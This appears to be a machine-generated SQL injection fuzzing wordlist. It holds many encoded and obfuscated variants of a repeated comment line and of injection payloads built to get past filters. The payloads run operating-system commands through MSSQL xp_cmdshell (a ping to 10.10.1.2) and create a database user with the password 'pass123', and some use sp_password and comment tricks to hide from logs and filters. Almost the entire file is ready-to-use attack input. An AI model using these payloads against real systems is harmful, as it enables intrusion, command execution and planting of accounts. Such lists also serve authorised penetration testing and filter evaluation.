# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
%00
IyB5b3Ugd2lsbCBuZWVkIHRvIGN1c3RvbWl6ZS9tb2RpZnkgc29tZSBvZiB0aGUgdmF1bGVzIGluIHRoZSBxdWVyaWVzIGZvciBiZXN0IGVmZmVjdAo=
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%2523%2520%2579%256F%2575%2520%2577%2569%256C%256C%2520%256E%2565%2565%2564%2520%2574%256F%2520%2563%2575%2573%2574%256F%256D%2569%257A%2565%252F%256D%256F%2564%2569%2566%2579%2520%2573%256F%256D%2565%2520%256F%2566%2520%2574%2568%2565%2520%2576%2561%2575%256C%2565%2573%2520%2569%256E%2520%2574%2568%2565%2520%2571%2575%2565%2572%2569%2565%2573%2520%2566%256F%2572%2520%2562%2565%2573%2574%2520%2565%2566%2566%2565%2563%2574%250A
%23%20%79%6F%75%20%77%69%6C%6C%20%6E%65%65%64%20%74%6F%20%63%75%73%74%6F%6D%69%7A%65%2F%6D%6F%64%69%66%79%20%73%6F%6D%65%20%6F%66%20%74%68%65%20%76%61%75%6C%65%73%20%69%6E%20%74%68%65%20%71%75%65%72%69%65%73%20%66%6F%72%20%62%65%73%74%20%65%66%66%65%63%74%0A
%u0023%u0020%u0079%u006F%u0075%u0020%u0077%u0069%u006C%u006C%u0020%u006E%u0065%u0065%u0064%u0020%u0074%u006F%u0020%u0063%u0075%u0073%u0074%u006F%u006D%u0069%u007A%u0065%u002F%u006D%u006F%u0064%u0069%u0066%u0079%u0020%u0073%u006F%u006D%u0065%u0020%u006F%u0066%u0020%u0074%u0068%u0065%u0020%u0076%u0061%u0075%u006C%u0065%u0073%u0020%u0069%u006E%u0020%u0074%u0068%u0065%u0020%u0071%u0075%u0065%u0072%u0069%u0065%u0073%u0020%u0066%u006F%u0072%u0020%u0062%u0065%u0073%u0074%u0020%u0065%u0066%u0066%u0065%u0063%u0074%u000A
# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%C0%AB%C0%AAyou%C0%AAwill%C0%AAneed%C0%AAto%C0%AAcustomize%C0%AFmodify%C0%AAsome%C0%AAof%C0%AAthe%C0%AAvaules%C0%AAin%C0%AAthe%C0%AAqueries%C0%AAfor%C0%AAbest%C0%AAeffect%C0%8A
%# %y%o%u %w%i%l%l %n%e%e%d %t%o %c%u%s%t%o%m%i%z%e%/%m%o%d%i%f%y %s%o%m%e %o%f %t%h%e %v%a%u%l%e%s %i%n %t%h%e %q%u%e%r%i%e%s %f%o%r %b%e%s%t %e%f%f%e%c%t%

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect
 and '0having'='0having'
# you will need to customize/modify some of the vaules in the queries for best effect
sp_password
#/**/you/**/will/**/need/**/to/**/customize/modify/**/some/**/of/**/the/**/vaules/**/in/**/the/**/queries/**/for/**/best/**/effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%01you%02will%0Dneed%08to%09customize/modify%0Csome%09of%0Athe%0Fvaules%0Din%04the%05queries%0Cfor%03best%01effect

# you will need to customize/modify some of the vaules in the queries for best effect

#%0Cyou%0Cwill%0Cneed%0Cto%09customize/modify%0Csome%0Dof%0Dthe%0Bvaules%0Din%0Bthe%0Aqueries%0Bfor%0Bbest%0Beffect

# you will need to customize/modify some of the vaules in the queries for best effect

#+you+will+need+to+customize/modify+some+of+the+vaules+in+the+queries+for+best+effect

#%09you%0Awill%0Dneed%09to%0Acustomize/modify%0Csome%09of%0Dthe%0Cvaules%0Cin%0Athe%09queries%0Dfor%0Cbest%09effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

# you will need to customize/modify some of the vaules in the queries for best effect

%EF%BC%87; exec master..xp_cmdshell %EF%BC%87ping 10.10.1.2%EF%BC%87--

%00%27; exec master..xp_cmdshell %00%27ping 10.10.1.2%00%27--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--
%00
JzsgZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdwaW5nIDEwLjEwLjEuMictLQo=
'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

%2527%253B%2520%2565%2578%2565%2563%2520%256D%2561%2573%2574%2565%2572%252E%252E%2578%2570%255F%2563%256D%2564%2573%2568%2565%256C%256C%2520%2527%2570%2569%256E%2567%2520%2531%2530%252E%2531%2530%252E%2531%252E%2532%2527%252D%252D%250A
%27%3B%20%65%78%65%63%20%6D%61%73%74%65%72%2E%2E%78%70%5F%63%6D%64%73%68%65%6C%6C%20%27%70%69%6E%67%20%31%30%2E%31%30%2E%31%2E%32%27%2D%2D%0A
%u0027%u003B%u0020%u0065%u0078%u0065%u0063%u0020%u006D%u0061%u0073%u0074%u0065%u0072%u002E%u002E%u0078%u0070%u005F%u0063%u006D%u0064%u0073%u0068%u0065%u006C%u006C%u0020%u0027%u0070%u0069%u006E%u0067%u0020%u0031%u0030%u002E%u0031%u0030%u002E%u0031%u002E%u0032%u0027%u002D%u002D%u000A
'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; /*!30231exec master..xp_cmdshell 'ping 10.10.1.2'*/--

'; /*!00000exec master..xp_cmdshell 'ping 10.10.1.2'*/--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

%C0%AF%C0%BB%C0%AAexec%C0%AAmaster%C0%AE%C0%AExp%C0%DFcmdshell%C0%AA%C0%AFping%C0%AA10%C0%AE10%C0%AE1%C0%AE2%C0%AF%C0%AF%C0%AF%C0%8A
%'%; %e%x%e%c %m%a%s%t%e%r%.%.%x%p%_%c%m%d%s%h%e%l%l %'%p%i%n%g %1%0%.%1%0%.%1%.%2%'%-%-%

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--
 and '0having'='0having'
'; exec master..xp_cmdshell 'ping 10.10.1.2'--
-- sp_password
';/**/exec/**/master..xp_cmdshell/**/'ping 10.10.1.2'--

';--mtZVWqeurC%0Aexec--JAQHqAehbMs%0Amaster..xp_cmdshell--ymAOYyu%0A'ping--gXHWDXgl%0A10.10.1.2'----HqFVfosQG%0A
';%23ykDYMq%0Aexec%23AslKxuafR%0Amaster..xp_cmdshell%23BuGToe%0A'ping%23TuXryqpwuKvp%0A10.10.1.2'--%23cJFNjGVQ%0A
';%23PUdIdbBPUMSL%0Aexec%23mRbZQwFOa%0Amaster..xp_cmdshell%23jWytUc%0A'ping%23NJqfifr%0A10.10.1.2'--%23VsRAzGE%0A
';%0Dexec%08master..xp_cmdshell%0F'ping 10.10.1.2'--

';%23%0Aexec%23%0Amaster..xp_cmdshell%23%0A'ping%23%0A10.10.1.2'--%23%0A
';%0Aexec%09master..xp_cmdshell%09'ping 10.10.1.2'--

';--%0Aexec--%0Amaster..xp_cmdshell--%0A'ping--%0A10.10.1.2'----%0A
';+exec+master..xp_cmdshell+'ping 10.10.1.2'--

';%09exec%0Amaster..xp_cmdshell%0A'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

%bf%27; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

%EF%BC%87create user name identified by %EF%BC%87pass123%EF%BC%87 --

%00%27create user name identified by %00%27pass123%00%27 --

'create user name identified by 'pass123' --
%00
J2NyZWF0ZSB1c2VyIG5hbWUgaWRlbnRpZmllZCBieSAncGFzczEyMycgLS0K
'create user name identified by 'pass123' --

'create user name identified by 'pass123' --

%2527%2563%2572%2565%2561%2574%2565%2520%2575%2573%2565%2572%2520%256E%2561%256D%2565%2520%2569%2564%2565%256E%2574%2569%2566%2569%2565%2564%2520%2562%2579%2520%2527%2570%2561%2573%2573%2531%2532%2533%2527%2520%252D%252D%250A
%27%63%72%65%61%74%65%20%75%73%65%72%20%6E%61%6D%65%20%69%64%65%6E%74%69%66%69%65%64%20%62%79%20%27%70%61%73%73%31%32%33%27%20%2D%2D%0A
